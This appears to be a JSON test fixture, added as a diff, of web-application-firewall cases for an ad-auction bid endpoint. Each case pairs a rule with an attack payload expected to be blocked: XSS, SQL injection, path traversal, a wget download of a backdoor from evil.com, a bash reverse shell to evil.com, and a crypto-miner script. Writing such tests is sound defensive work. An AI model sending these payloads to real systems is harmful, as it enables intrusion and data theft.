@@ -1,0 +1,356 @@
+{
+  "test_cases": [
+    {
+      "name": "Bid Manipulation - Negative Price",
+      "description": "Tests Rule 10001: Negative bid price",
+      "rule_id": "10001",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-001",
+        "imp": [{"id": "1", "banner": {"w": 300, "h": 250}}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "price": -100.00
+      }
+    },
+    {
+      "name": "Bid Manipulation - Absurdly High Price",
+      "description": "Tests Rule 10001: Price over $1,000,000 CPM",
+      "rule_id": "10001",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-002",
+        "imp": [{"id": "1", "banner": {"w": 300, "h": 250}}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "price": 9999999.00
+      }
+    },
+    {
+      "name": "Publisher ID Enumeration",
+      "description": "Tests Rule 10002: Excessively long publisher ID",
+      "rule_id": "10002",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-003",
+        "imp": [{"id": "1", "banner": {"w": 300, "h": 250}}],
+        "site": {
+          "domain": "evil.com",
+          "publisher": {
+            "id": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+          }
+        }
+      }
+    },
+    {
+      "name": "Malicious Creative - Script Tag",
+      "description": "Tests Rule 10003: JavaScript in creative",
+      "rule_id": "10003",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-004",
+        "imp": [{
+          "id": "1",
+          "banner": {
+            "w": 300,
+            "h": 250
+          }
+        }],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "adm": "<script>alert('XSS')</script>"
+      }
+    },
+    {
+      "name": "Malicious Creative - JavaScript Iframe",
+      "description": "Tests Rule 10004: JavaScript iframe injection",
+      "rule_id": "10004",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-005",
+        "imp": [{"id": "1", "banner": {"w": 300, "h": 250}}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "adm": "<iframe src='javascript:alert(1)'></iframe>"
+      }
+    },
+    {
+      "name": "JSON Depth DoS Attack",
+      "description": "Tests Rule 10005: Excessively deep JSON nesting",
+      "rule_id": "10005",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-006",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "nested": {"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": {"k": {"l": {"m": {"n": {"o": {"p": "too deep"}}}}}}}}}}}}}}}
+      }
+    },
+    {
+      "name": "SQL Injection - UNION SELECT",
+      "description": "Tests Rule 10006: SQL injection attempt",
+      "rule_id": "10006",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-007",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "evil.com' UNION SELECT password FROM users--",
+          "publisher": {"id": "pub-123"}
+        }
+      }
+    },
+    {
+      "name": "SQL Injection - INSERT INTO",
+      "description": "Tests Rule 10006: SQL injection with INSERT",
+      "rule_id": "10006",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-008",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "evil.com",
+          "publisher": {
+            "id": "pub'; INSERT INTO admins VALUES ('hacker', 'password')--"
+          }
+        }
+      }
+    },
+    {
+      "name": "Path Traversal Attack",
+      "description": "Tests Rule 10007: Directory traversal attempt",
+      "rule_id": "10007",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-009",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "evil.com",
+          "page": "https://evil.com/../../etc/passwd"
+        }
+      }
+    },
+    {
+      "name": "Command Injection - Wget",
+      "description": "Tests Rule 10008: Command injection with wget",
+      "rule_id": "10008",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-010",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "evil.com; wget http://evil.com/backdoor.sh"
+        }
+      }
+    },
+    {
+      "name": "Command Injection - Bash",
+      "description": "Tests Rule 10008: Command injection with bash",
+      "rule_id": "10008",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-011",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "$(bash -i >& /dev/tcp/evil.com/8080 0>&1)"
+        }
+      }
+    },
+    {
+      "name": "Malicious User-Agent - SQLMap",
+      "description": "Tests Rule 10100: Known attack tool user agent",
+      "rule_id": "10100",
+      "expected": "403 Forbidden",
+      "headers": {
+        "User-Agent": "sqlmap/1.0"
+      },
+      "payload": {
+        "id": "attack-012",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Malicious User-Agent - Nikto",
+      "description": "Tests Rule 10100: Nikto scanner",
+      "rule_id": "10100",
+      "expected": "403 Forbidden",
+      "headers": {
+        "User-Agent": "Nikto/2.1.5"
+      },
+      "payload": {
+        "id": "attack-013",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Missing User-Agent on Auction",
+      "description": "Tests Rule 10101: Missing User-Agent header",
+      "rule_id": "10101",
+      "expected": "403 Forbidden",
+      "headers": {
+        "User-Agent": ""
+      },
+      "payload": {
+        "id": "attack-014",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Bot User-Agent",
+      "description": "Tests Rule 10102: Bot signature in User-Agent",
+      "rule_id": "10102",
+      "expected": "403 Forbidden",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)"
+      },
+      "payload": {
+        "id": "attack-015",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Missing Request ID",
+      "description": "Tests Rule 10200: Missing required id field",
+      "rule_id": "10200",
+      "expected": "403 Forbidden",
+      "payload": {
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Missing Impressions Array",
+      "description": "Tests Rule 10201: Missing imp array",
+      "rule_id": "10201",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-017",
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Excessive Impressions DoS",
+      "description": "Tests Rule 10202: Too many impressions",
+      "rule_id": "10202",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-018",
+        "imp": [
+          {"id": "1"}, {"id": "2"}, {"id": "3"}, {"id": "4"}, {"id": "5"},
+          {"id": "6"}, {"id": "7"}, {"id": "8"}, {"id": "9"}, {"id": "10"},
+          {"id": "11"}, {"id": "12"}, {"id": "13"}, {"id": "14"}, {"id": "15"},
+          {"id": "16"}, {"id": "17"}, {"id": "18"}, {"id": "19"}, {"id": "20"},
+          {"id": "21"}, {"id": "22"}, {"id": "23"}, {"id": "24"}, {"id": "25"},
+          {"id": "26"}, {"id": "27"}, {"id": "28"}, {"id": "29"}, {"id": "30"},
+          {"id": "31"}, {"id": "32"}, {"id": "33"}, {"id": "34"}, {"id": "35"},
+          {"id": "36"}, {"id": "37"}, {"id": "38"}, {"id": "39"}, {"id": "40"},
+          {"id": "41"}, {"id": "42"}, {"id": "43"}, {"id": "44"}, {"id": "45"},
+          {"id": "46"}, {"id": "47"}, {"id": "48"}, {"id": "49"}, {"id": "50"},
+          {"id": "51"}, {"id": "52"}, {"id": "53"}, {"id": "54"}, {"id": "55"},
+          {"id": "56"}, {"id": "57"}, {"id": "58"}, {"id": "59"}, {"id": "60"},
+          {"id": "61"}, {"id": "62"}, {"id": "63"}, {"id": "64"}, {"id": "65"},
+          {"id": "66"}, {"id": "67"}, {"id": "68"}, {"id": "69"}, {"id": "70"},
+          {"id": "71"}, {"id": "72"}, {"id": "73"}, {"id": "74"}, {"id": "75"},
+          {"id": "76"}, {"id": "77"}, {"id": "78"}, {"id": "79"}, {"id": "80"},
+          {"id": "81"}, {"id": "82"}, {"id": "83"}, {"id": "84"}, {"id": "85"},
+          {"id": "86"}, {"id": "87"}, {"id": "88"}, {"id": "89"}, {"id": "90"},
+          {"id": "91"}, {"id": "92"}, {"id": "93"}, {"id": "94"}, {"id": "95"},
+          {"id": "96"}, {"id": "97"}, {"id": "98"}, {"id": "99"}, {"id": "100"},
+          {"id": "101"}, {"id": "102"}, {"id": "103"}, {"id": "104"}, {"id": "105"}
+        ],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "Multiple Publisher IDs",
+      "description": "Tests Rule 10300: Auth bypass with multiple publisher IDs",
+      "rule_id": "10300",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-019",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "evil.com",
+          "publisher": {"id": "pub-123"},
+          "pub": {"id": "pub-456"}
+        }
+      }
+    },
+    {
+      "name": "Null Byte in Publisher ID",
+      "description": "Tests Rule 10301: Null byte injection",
+      "rule_id": "10301",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-020",
+        "imp": [{"id": "1"}],
+        "site": {
+          "domain": "evil.com",
+          "publisher": {"id": "pub-123\\u0000admin"}
+        }
+      }
+    },
+    {
+      "name": "Cryptocurrency Miner in Creative",
+      "description": "Tests Rule 10500: Coinhive crypto miner",
+      "rule_id": "10500",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-021",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "adm": "<script src='https://coinhive.com/lib/coinhive.min.js'></script>"
+      }
+    },
+    {
+      "name": "Malicious Redirect in Creative",
+      "description": "Tests Rule 10501: window.location redirect",
+      "rule_id": "10501",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-022",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "adm": "<script>window.location='https://phishing.com'</script>"
+      }
+    },
+    {
+      "name": "eval() in Creative",
+      "description": "Tests Rule 10502: eval() usage (code injection vector)",
+      "rule_id": "10502",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-023",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "adm": "<script>eval(atob('bWFsaWNpb3VzX2NvZGU='))</script>"
+      }
+    },
+    {
+      "name": "OWASP ZAP User-Agent",
+      "description": "Generic attack scanner detection",
+      "rule_id": "CRS",
+      "expected": "403 Forbidden",
+      "headers": {
+        "User-Agent": "OWASP ZAP 2.10.0"
+      },
+      "payload": {
+        "id": "attack-024",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}}
+      }
+    },
+    {
+      "name": "XSS via onerror",
+      "description": "XSS attack via onerror attribute",
+      "rule_id": "CRS",
+      "expected": "403 Forbidden",
+      "payload": {
+        "id": "attack-025",
+        "imp": [{"id": "1"}],
+        "site": {"domain": "evil.com", "publisher": {"id": "pub-123"}},
+        "adm": "<img src=x onerror=alert('XSS')>"
+      }
+    }
+  ]
+}
